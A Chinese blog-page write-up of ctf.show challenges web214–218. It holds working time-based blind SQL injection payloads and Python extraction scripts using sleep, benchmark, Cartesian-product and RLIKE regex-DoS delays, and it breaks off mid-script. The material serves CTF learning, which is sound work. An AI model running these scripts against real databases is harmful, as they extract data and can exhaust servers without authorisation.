<!DOCTYPE html>
<html data-theme="">
<head>
    <!-- ! 引用文件位置-->
    <!--引用文件位置-->
<meta charset="utf-8">
<title>原神，启动！！</title>
<!--    daisyui cdn-->
<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
<!--     tailwindcss cdn daisyui 前置-->
<script src="https://cdn.tailwindcss.com"></script>
<!--    更改主题颜色-->
<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
<!--自动排版-->
<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
<!--    谷歌字体库镜像-->
<style>
    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
</style>
<!--jquery-->
<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
<!--    fancybox-->
<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
<!--highlight 代码高亮 使用hexo的不会高亮-->
<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
<script>
    hljs.highlightAll();
</script>
<link rel="stylesheet"
      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
<!--    自定义css-->

<link rel="stylesheet" href="/css/output.css">


<link rel="stylesheet" href="/css/style.css">

<!--    自定义js-->

<script src="/js/view.js"></script>


<script src="/js/fancybox.js"></script>


<script src="/js/search.js"></script>

<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
<meta name="referrer" content="no-referrer"/>
<meta name="generator" content="Hexo 7.0.0"></head>
<body>
<!--导航栏-->
<div class="">
    <div class="container-nav justify-center flex">
        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
            <div class="flex-1">
                <a class="btn btn-ghost text-xl" href="/">原神，启动！</a>
            </div>
            <div class="flex-none gap-2">
                <ul class="menu menu-horizontal px-1">
                    
                    
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/">首页</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/archives">文章</a></li>
                        
                            <!--去掉最后一位是，-->
                            <li><a href="/about">关于</a></li>
                        
                    
                    <!--<li><a href="/">Home</a></li>-->
                    <!--<li><a href="/archives">Archive</a></li>-->
                    <!--<li><a href="/about/">About</a></li>-->
                    <li>
                        <details class="dropdown">
                            <summary>
                                更换主题
                            </summary>
                            <ul tabindex="0"
                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
                                <!--主题选择配置，主题来自daisyui-->

<li><a data-set-theme="light">Light</a></li>
<li><a data-set-theme="dark">Night</a></li>
<li><a data-set-theme="cupcake">Cupcake</a></li>
<li><a data-set-theme="bumblebee">Bumblebee</a></li>
<li><a data-set-theme="emerald">Emerald</a></li>
<li><a data-set-theme="coporate">Corporate</a></li>
<li><a data-set-theme="synthwave">Synthwave</a></li>
<li><a data-set-theme="retro">Retro</a></li>
<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
<li><a data-set-theme="halloween">Halloween</a></li>
<li><a data-set-theme="garden">Garden</a></li>
<li><a data-set-theme="forest">Forest</a></li>
<li><a data-set-theme="aqua">Aqua</a></li>
<li><a data-set-theme="lofi">Lo-fi</a></li>
<li><a data-set-theme="pastel">Pastel</a></li>
<li><a data-set-theme="fantasy">Fantasy</a></li>
<li><a data-set-theme="wireframe">Wireframe</a></li>
<li><a data-set-theme="black">Black</a></li>
<li><a data-set-theme="luxury">Luxury</a></li>
<li><a data-set-theme="dracula">Dracula</a></li>
<li><a data-set-theme="cmyk">CMYK</a></li>
<li><a data-set-theme="autumn">Autumn</a></li>
<li><a data-set-theme="business">Business</a></li>
<li><a data-set-theme="acid">Acid</a></li>
<li><a data-set-theme="lemonade">Lemonade</a></li>
<li><a data-set-theme="night">Night</a></li>
<li><a data-set-theme="coffee">Coffee</a></li>
<li><a data-set-theme="winter">Winter</a></li>
<li><a data-set-theme="dim">Dim</a></li>
<li><a data-set-theme="nord">Nord</a></li>
<li><a data-set-theme="sunset">Sunset</a></li>
                            </ul>
                        </details>
                    </li>
                </ul>
                <div class="form-control">

                    <input type="text" placeholder="Search is not yet!" id="local-search-input"
                           class="st-search-input input input-bordered w-24 md:w-auto rounded-xl"/>
                    <div id="local-search-result" class="local-search-result-cls rounded-xl"></div>
                    <script type="text/javascript" id="local.search.active">
                        var inputArea = document.querySelector("#local-search-input");
                        inputArea.onclick = function () {
                            getSearchFile();
                            this.onclick = null
                        }
                        inputArea.onkeydown = function () {
                            if (event.keyCode === 13) return false
                        }
                    </script>
                </div>
                <div class="dropdown dropdown-end">
                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
                        <div class="w-10 rounded-full">
                            <img alt="Tailwind CSS Navbar component"
                                 src="https://s3.bmp.ovh/imgs/2023/03/12/d3fe3843da0a1878.jpg"/>
                        </div>
                    </div>
                    <!--TODO 完成这里-->
                    <!--<ul tabindex="0"-->
                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
                    <!--    <li>-->
                    <!--        <a class="justify-between">-->
                    <!--            Profile-->
                    <!--            <span class="badge">New</span>-->
                    <!--        </a>-->
                    <!--    </li>-->
                    <!--    <li><a>Settings</a></li>-->
                    <!--    <li><a>Logout</a></li>-->
                    <!--</ul>-->
                </div>
            </div>
        </div>
    </div>
</div>
<!--导航栏结束-->
<div class="fleet">
    <!--    嵌套位置-->
    <!-- 博客详情 -->


<!--Post开始-->
<div class="fleet container-nav justify-center flex mb-16 w-full">
    <div class="w-8/12 justify-center flex">
        <div class="fleet-body flex-col w-full">
            <div class="fleet-header">
                <div class="fleet-content-header-title text-6xl">
                    <h1 class="inline-block font-extrabold mt-16 mb-8">web214-web253SQL注入篇（三）</h1>
                </div>
                <div class="fleet-content-header-info">
                    <span>2023/09/17 17:23:43</span>
                </div>
            </div>
            <div class="divider w-full"></div>
            <div class="fleet-content mt-8">
                <div class="fleet-content-body">
                    <div class="fleet-content-body-content justify-center flex w-full">
                        
                        <!--代码块-->
                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
                        
                        <!--图片-->
                        
                        <article class="prose">
                            <h1 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h1><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>终于知道是哪来的注入点了，在主页的网络包中有一个<code>select.js</code>中能看到：</p>
<pre class="language-json" data-language="json"><code class="language-json">$.ajax(&#123;
  url:&#39;api&#x2F;&#39;,
  dataType:&quot;json&quot;,
  type:&#39;post&#39;,
  data:&#123;
    ip:returnCitySN[&quot;cip&quot;],
    debug:0
  &#125;

&#125;);</code></pre>
<p>向其中可以存在注入点。<br>hackbar测试一下：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689282687265-a4a97ad1-82db-4165-ba3f-d36f1b9c060b.png" alt="image.png"><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689282697392-c201a11b-9f33-4447-837e-6f89afbcd904.png" alt="image.png"><br>有sql执行，继续构建测试payload：</p>
<pre class="language-plsql" data-language="plsql"><code class="language-plsql">ip&#x3D;if(substr(database(),1,1)&#x3D;(&#39;c&#39;),sleep(5),1)&amp;debug&#x3D;0</code></pre>
<p>然后就是写脚本<br>先贴一下佬们的脚本：</p>
<pre class="language-plsql" data-language="plsql"><code class="language-plsql">&quot;&quot;&quot;
Author:Y4tacker
&quot;&quot;&quot;
import requests

url &#x3D; &quot;http:&#x2F;&#x2F;d23ee9e9-3e43-4b0a-b172-547561ea456d.chall.ctf.show&#x2F;api&#x2F;&quot;

result &#x3D; &quot;&quot;
i &#x3D; 0
while True:
    i &#x3D; i + 1
    head &#x3D; 32
    tail &#x3D; 127

    while head &lt; tail:
        mid &#x3D; (head + tail) &gt;&gt; 1
        # 查数据库
        # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;
        # 查列名字-id.flag
        # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagx&#39;&quot;
        # 查数据
        payload &#x3D; &quot;select flaga from ctfshow_flagx&quot;
        data &#x3D; &#123;
            &#39;ip&#39;: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(1),1)&quot;,
            &#39;debug&#39;:&#39;0&#39;
        &#125;
        try:
            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)
            tail &#x3D; mid
        except Exception as e:
            head &#x3D; mid + 1

    if head !&#x3D; 32:
        result +&#x3D; chr(head)
    else:
        break
    print(result)</code></pre>
<p>我的脚本：</p>
<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
&quot;&quot;&quot;
@File    :   SQL时间盲注1.py   
@Contact :   2997453446@qq.com
@Blog    :   natro92.github.io
 
@Modify Time      @Author    @Version    @Desciption
------------      -------    --------    -----------
2023&#x2F;7&#x2F;14 5:20   natro92      1.0         None
&quot;&quot;&quot;
import requests

url &#x3D; r&#39;http:&#x2F;&#x2F;6ec95228-b921-42dc-ba05-78d8a7decd79.challenge.ctf.show&#x2F;api&#x2F;&#39;
flag_pre &#x3D; &#39;ctfshow&#123;&#39;
str &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_-&#125; &quot;
# inside &#x3D; &#39;database()&#39;
# inside &#x3D; &#39;select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()&#39;
# inside &#x3D; &#39;select group_concat(column_name) from information_schema.columns where table_name &#x3D; &quot;ctfshow_flagx&quot;&#39;
inside &#x3D; &#39;select group_concat(flaga) from ctfshow_flagx&#39;

payload &#x3D; &#39;if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;(&quot;&#123;&#125;&quot;),sleep(1),1)&#39;
res &#x3D; &#39;&#39;
last &#x3D; &#39; &#39;

for i in range(1, 100):
    for j in str:
        data &#x3D; &#123;
            &#39;ip&#39;: payload.format(inside, i, j),
            &#39;debug&#39;: 0
        &#125;
        # 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调
        try:
            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)
        except Exception as e:
            last &#x3D; res
            res +&#x3D; j
            break
        if last &#x3D;&#x3D; res.replace(&#39; &#39;,&#39;&#39;):
            exit()
    print(res)</code></pre>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>substr这个函数不从0开始，从1开始。别傻乎乎的用错了。<br>可以用try来做一个微调，如果出现问题就可以自己修改。<br>注意要传的是<code>/api/</code>不是<code>/api</code>传错了可没有回显</p>
<h1 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h1><p>提示用了单引号，得闭合一下就行<br>测试payload：</p>
<pre class="language-python" data-language="python"><code class="language-python">ip&#x3D;1&#39; or sleep(3) and &#39;1&#39;&#x3D;&#39;1&amp;debug&#x3D;0
或者
ip&#x3D;1&#39; or sleep(3) #&amp;debug&#x3D;0</code></pre>
<p>修改脚本：</p>
<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
&quot;&quot;&quot;
@File    :   SQL时间盲注1.py   
@Contact :   2997453446@qq.com
@Blog    :   natro92.github.io
 
@Modify Time      @Author    @Version    @Desciption
------------      -------    --------    -----------
2023&#x2F;7&#x2F;14 5:20   natro92      1.0         None
&quot;&quot;&quot;
import requests

url &#x3D; r&#39;http:&#x2F;&#x2F;8f775fc1-f6d1-431e-9ac4-93ab0f082a11.challenge.ctf.show&#x2F;api&#x2F;&#39;
flag_pre &#x3D; &#39;ctfshow&#123;&#39;
str &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_-&#125; &quot;
# inside &#x3D; &#39;database()&#39;
# inside &#x3D; &#39;select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()&#39;
# inside &#x3D; &#39;select group_concat(column_name) from information_schema.columns where table_name &#x3D; &quot;ctfshow_flagxc&quot;&#39;
inside &#x3D; &#39;select group_concat(flagaa) from ctfshow_flagxc&#39;

payload &#x3D; &quot;1&#39; or if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),sleep(1),1)#&quot;
res &#x3D; &#39;&#39;
last &#x3D; &#39; &#39;

for i in range(1, 100):
    for j in str:
        data &#x3D; &#123;
            &#39;ip&#39;: payload.format(inside, i, j),
            &#39;debug&#39;: 0
        &#125;
        # 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调
        try:
            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)
        except Exception as e:
            last &#x3D; res
            res +&#x3D; j
            break
        if last &#x3D;&#x3D; res.replace(&#39; &#39;,&#39;&#39;):
            exit()
    print(res)


</code></pre>
<h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p>操作可以快一点，用一点快捷键。<br>pycharm中搜索快捷键<code>ctrl + f</code>，替换快捷键<code>ctrl + r</code>。<br>搜索中修改正则：</p>
<pre class="language-python" data-language="python"><code class="language-python">http:&#x2F;&#x2F;[a-zA-Z0-9-.&#x2F;]+</code></pre>
<p>然后替换写入新网址，这样就能快一点</p>
<h1 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h1><h3 id="from-base64-id"><a href="#from-base64-id" class="headerlink" title="from_base64($id)"></a>from_base64($id)</h3><p>加了一个查询：</p>
<pre class="language-python" data-language="python"><code class="language-python">where id &#x3D; from_base64($id);</code></pre>
<p>只需要把1的base64 <code>MQ==</code>，添加的到原payload中：</p>
<pre class="language-python" data-language="python"><code class="language-python">ip&#x3D;&#39;MQ&#x3D;&#x3D;&#39;) or sleep(3) and &#39;1&#39;&#x3D;&#39;1&amp;debug&#x3D;0</code></pre>
<h1 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h1><h3 id="benchmark函数的时间盲注"><a href="#benchmark函数的时间盲注" class="headerlink" title="benchmark函数的时间盲注"></a>benchmark函数的时间盲注</h3><p>加了个过滤，把sleep给ban了，可以用benchmark代替。<br>BENCHMARK是SQL中的一个函数,主要用于测试SQL语句的执行效率。其语法如下:</p>
<pre class="language-python" data-language="python"><code class="language-python">BENCHMARK(count, expr)</code></pre>
<p>其中count表示重复执行expr的次数。<br>这里的测试如下：</p>
<pre class="language-python" data-language="python"><code class="language-python">ip&#x3D;1) and benchmark(500000,sha(1))#&amp;debug&#x3D;0</code></pre>
<p>由于网络环境不同，需要根据情况下微调timeout的值：<br>这里我有点没太明白的点在于，为什么调用database函数时和查询时相同benchmark的延迟差很多</p>
<pre class="language-python" data-language="python"><code class="language-python">比如
ip&#x3D;1) or if(substr((database()),1,1)&#x3D;(&#39;c&#39;),benchmark(500000,sha(1)),1)#
&amp;debug&#x3D;0
有1.45s
而
ip&#x3D;1) or if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1)&#x3D;(&#39;c&#39;),benchmark(3500000,sha(1)),1)#
&amp;debug&#x3D;0
是1.72s</code></pre>
<p>因此次数在脚本中需要多次调试。<br>而且由于这个时间是随着运行时间增长而会导致越到后面越不准确。<br>因此可以用limit关键字对flag进行分割。</p>
<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
&quot;&quot;&quot;
@File    :   SQL时间盲注1.py   
@Contact :   2997453446@qq.com
@Blog    :   natro92.github.io
 
@Modify Time      @Author    @Version    @Desciption
------------      -------    --------    -----------
2023&#x2F;7&#x2F;14 5:20   natro92      1.0         None
&quot;&quot;&quot;
import time

import requests

url &#x3D; r&#39;http:&#x2F;&#x2F;b78d98e8-2199-4723-bf89-18fed148eb42.challenge.ctf.show&#x2F;api&#x2F;&#39;
flag_pre &#x3D; &#39;ctfshow&#123;&#39;
str &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;-&#125; &quot;
# inside &#x3D; &#39;database()&#39;
# inside &#x3D; &#39;select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()&#39;
# inside &#x3D; &#39;select group_concat(column_name) from information_schema.columns where table_name &#x3D; &quot;ctfshow_flagxccb&quot;&#39;
inside &#x3D; &#39;substr((select group_concat(flagaabc) from ctfshow_flagxccb),9,36)&#39;

payload &#x3D; &quot;1) or if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),benchmark(2500000,sha(1)),1)#&quot;
res &#x3D; &#39;&#39;
last &#x3D; &#39; &#39;

for i in range(1, 100):
    for j in str:
        data &#x3D; &#123;
            &#39;ip&#39;: payload.format(inside, i, j),
            &#39;debug&#39;: 0
        &#125;
        # 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调
        try:
            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)
        except Exception as e:
            last &#x3D; res
            res +&#x3D; j
            break
        if last &#x3D;&#x3D; res.replace(&#39; &#39;,&#39;&#39;):
            exit()
        time.sleep(1)
    print(res)</code></pre>
<p>观察之前的flag<br><code>ctfshow&#123;c059a105-e0f9-41b5-a49e-002ac179386a&#125;</code><br>从第九位开始七位，从17开始10位 从28开始12位</p>
<pre class="language-python" data-language="python"><code class="language-python">44n3955e
-cec3-
4c84-
bb3f-
91f5caab1040&#125;
ctfshow&#123;44n3955e-cec3-4c84-bb3f-91f5caab1040&#125;
44239p5d-cec3-4c84-bb3f-91f5caab1040fb
4443955d</code></pre>
<p>这道太折磨人了做的要死了。 我操了 注三遍三个结果，破b脚本跑了3个小时，还是用大佬们的二分法跑吧，这个也太慢了。</p>
<h2 id="其他的时间盲注骚姿势"><a href="#其他的时间盲注骚姿势" class="headerlink" title="其他的时间盲注骚姿势"></a>其他的时间盲注骚姿势</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5505">https://xz.aliyun.com/t/5505</a></p>
</blockquote>
<h3 id="笛卡尔积盲注"><a href="#笛卡尔积盲注" class="headerlink" title="笛卡尔积盲注"></a>笛卡尔积盲注</h3><p>注入姿势</p>
<pre class="language-python" data-language="python"><code class="language-python">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;
+-----------+
| count(*)  |
+-----------+
| 113101560 |
+-----------+
1 row in set (2.07 sec)
 
 mysql&gt; select  from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;1 and (SELECT count() FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);
+------+-----+
| user | pwd |
+------+-----+
| 1    | 0   |
+------+-----+
1 row in set (2.08 sec)

mysql&gt; select  from ctf_test where user&#x3D;&#39;1&#39; and 1&#x3D;0 and (SELECT count() FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);
Empty set (0.01 sec)</code></pre>

<p>利用and短路运算规则进行时间盲注。</p>
<h3 id="GET-LOCK盲注"><a href="#GET-LOCK盲注" class="headerlink" title="GET_LOCK盲注"></a>GET_LOCK盲注</h3><p>get_lock函数官方文档中的介绍<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689289973207-90f19c56-353b-4128-8a5c-9b65198645bf.png" alt="ZZAQbT.md.png"><br>可以看出文档中写的是我们如果已经开了一个session，对关键字进行了get_lock,那么再开另一个session再次对关键进行get_lock，就会延时我们指定的时间。<br>此盲注手法有一些限制，就是必须要同时开两个SESSION进行注入<br>SESSION A</p>
<pre class="language-python" data-language="python"><code class="language-python">mysql&gt; select get_lock(&#39;lihuaiqiu&#39;,1);
+-------------------------+
| get_lock(&#39;lihuaiqiu&#39;,1) |
+-------------------------+
|                       1 |
+-------------------------+
1 row in set (0.00 sec)</code></pre>

<p>SESSION B</p>
<pre class="language-python" data-language="python"><code class="language-python">mysql&gt; select get_lock(&#39;lihuaiqiu&#39;,5);
+-------------------------+
| get_lock(&#39;lihuaiqiu&#39;,5) |
+-------------------------+
|                       0 |
+-------------------------+
1 row in set (5.00 sec)

 mysql&gt; select * from ctf_test where user&#x3D;&#39;0&#39; and 1&#x3D;1 and  get_lock(&#39;lihuaiqiu&#39;,2);
Empty set (2.00 sec)

mysql&gt; select * from ctf_test where user&#x3D;&#39;0&#39; and 1&#x3D;0 and  get_lock(&#39;lihuaiqiu&#39;,2);
Empty set (0.00 sec)</code></pre>
<p>同样的盲注利用手法。</p>
<h3 id="正则DOS-RLIKE注入"><a href="#正则DOS-RLIKE注入" class="headerlink" title="正则DOS RLIKE注入"></a>正则DOS RLIKE注入</h3><p>延时原理，利用SQL多次计算正则消耗计算资源产生延时效果，其实原理是和我们的benchmark注入差不多的。<br>利用手法</p>
<pre class="language-python" data-language="python"><code class="language-python">mysql&gt; select  from flag where flag&#x3D;&#39;1&#39; and if(mid(user(),1,1)&#x3D;&#39;s&#39;,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+b&#39;,1);
+------+
| flag |
+------+
| 1    |
+------+
1 row in set (0.00 sec)

mysql&gt; select  from flag where flag&#x3D;&#39;1&#39; and if(mid(user(),1,1)&#x3D;&#39;r&#39;,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+cd&#39;,1);
Empty set (3.83 sec)</code></pre>
<h1 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h1><h3 id="笛卡尔乘积"><a href="#笛卡尔乘积" class="headerlink" title="笛卡尔乘积"></a>笛卡尔乘积</h3><p>benchmark也被禁用了，用笛卡尔积运算来达到延迟的目的<br>主要的语句是：</p>
<pre class="language-python" data-language="python"><code class="language-python">SELECT count(*) FROM information_schema.columns A, information_schema.columns B</code></pre>
<p>拼接到payload里面测试一下：<br>不够就一直加，加到有延迟为止。<br>就不一点点爆了，直接梭。</p>
<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
&quot;&quot;&quot;
@File    :   SQL时间盲注1.py   
@Contact :   2997453446@qq.com
@Blog    :   natro92.github.io
 
@Modify Time      @Author    @Version    @Desciption
------------      -------    --------    -----------
2023&#x2F;7&#x2F;14 5:20   natro92      1.0         None
&quot;&quot;&quot;
import time

import requests

url &#x3D; r&#39;http:&#x2F;&#x2F;f277bdb1-e417-43a9-a241-8a77c0cdaeff.challenge.ctf.show&#x2F;api&#x2F;&#39;
flag_pre &#x3D; &#39;ctfshow&#123;&#39;
str &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789_&#123;-&#125; &quot;
# inside &#x3D; &#39;database()&#39;
# inside &#x3D; &#39;select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()&#39;
# inside &#x3D; &#39;select group_concat(column_name) from information_schema.columns where table_name &#x3D; &quot;ctfshow_flagxc&quot;&#39;
inside &#x3D; &#39;substr((select group_concat(flagaac) from ctfshow_flagxc),9,36)&#39;

payload &#x3D; &quot;1) or if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1)#&quot;
res &#x3D; &#39;&#39;
last &#x3D; &#39; &#39;

for i in range(1, 100):
    for j in str:
        data &#x3D; &#123;
            &#39;ip&#39;: payload.format(inside, i, j),
            &#39;debug&#39;: 0
        &#125;
        # 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调
        try:
            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)
        except Exception as e:
            last &#x3D; res
            res +&#x3D; j
            break
        if last &#x3D;&#x3D; res.replace(&#39; &#39;,&#39;&#39;):
            exit()
        time.sleep(1)
    print(res)</code></pre>
<h2 id="Rlike"><a href="#Rlike" class="headerlink" title="Rlike"></a>Rlike</h2><pre class="language-python" data-language="python"><code class="language-python">select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);

正则语法：
. : 匹配任意单个字符
* ： 匹配0个或多个前一个得到的字符
[] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。
^ : 匹配开头，如^s匹配以s或者S开头的字符串。
$ : 匹配结尾，如s$匹配以s结尾的字符串。
&#123;n&#125; : 匹配前一个字符反复n次。

RPAD(str,len,padstr)
用字符串 padstr对 str进行右边填补直至它的长度达到 len个字符长度，然后返回 str。如果 str的长度长于 len&#39;，那么它将被截除到 len个字符。
mysql&gt; SELECT RPAD(&#39;hi&#39;,5,&#39;?&#39;); -&gt; &#39;hi???&#39;

repeat(str,times)  复制字符串times次</code></pre>
<pre class="language-python" data-language="python"><code class="language-python"># -- coding:UTF-8 --
# Author:孤桜懶契
# Date:2021&#x2F;7&#x2F;31
# blog: gylq.gitee.io
import requests
import time
bypass&#x3D;&quot;concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;&quot;
url &#x3D; &quot;http:&#x2F;&#x2F;4f04cb91-f6ed-43ce-bc4d-539d9c5b2a7b.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;
str &#x3D; &quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;
flag &#x3D; &quot;&quot;
#1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1)&#x3D;&#39;c&#39;,( concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;),0)#
